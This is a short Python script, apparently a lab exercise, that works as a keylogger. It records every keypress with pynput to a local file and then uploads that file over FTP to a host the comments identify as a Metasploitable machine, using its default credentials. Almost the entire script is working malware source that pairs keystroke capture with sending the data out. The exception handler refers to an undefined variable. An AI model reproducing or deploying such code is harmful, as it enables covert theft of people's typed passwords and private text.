from pynput.keyboard import Key, Listener
import ftplib
import logging

dirname= "" # For getting the current path
logging.basicConfig(filename=(dirname+"logresult.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s") # Create and configure logger 

def onKeyPress(Key): # Event = pressing any key
    try:
        logging.info(str(Key))
    except AttributeError:
        print("The pressed key {0} is a special character.".format(key))

def onKeyRelease(key): # Event = releasing the key
    if key==Key.esc:
        return False

print("\nStarted listening\n")

with Listener(on_press=onKeyPress, on_release=onKeyRelease) as listener:
    listener.join()

print("\nConnecting to FTP and sending data\n")

# For sending files over FTP to metasploitable system

sess= ftplib.FTP("", "msfadmin", "msfadmin")    # IP address, metasploitable default username, metasploitable default passwordd
file= open("logresult.txt","rb")
sess.storbinary("STOR logresult.txt",file)
file.close()
sess.quit()